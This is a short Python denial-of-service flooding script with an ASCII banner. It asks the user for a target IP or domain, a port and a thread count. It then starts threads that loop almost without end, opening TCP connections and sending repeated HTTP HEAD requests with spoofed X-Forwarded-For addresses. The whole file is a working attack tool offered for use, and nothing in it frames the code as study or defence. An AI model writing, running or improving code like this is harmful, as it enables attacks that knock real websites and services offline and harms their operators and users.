import socket
import os, sys
import time
import threading, random

print('''
╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗  ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗
╚═╗║ ║║  ╠╩╗║╣  ║   ║║║║╣  ║ ╠═╣║ ║ ║║
╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩   ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝
		 -- Works on HTTP and IP--
	 					[L4 & L7]
''')
ip = input("IP/Domain: ")
port = int(input("Port: "))
th = int(input("Threads: "))

url = "http://" + str(ip)

def randomip():
  randip = ".".join(map(str, (random.randint(0, 255) 
                                    for _ in range(4))))
  return(randip)

print("[>>>] Starting the attack [<<<]")


time.sleep(1)

inf = 1000000000

def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  for i in range(1, inf):
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(.1)
    except:
      pass


def threader():
		global threads
		threads=[]
		for i in range(th):
				t=threading.Thread(target=attack)
				threads.append(t)
				t.start()
threader()
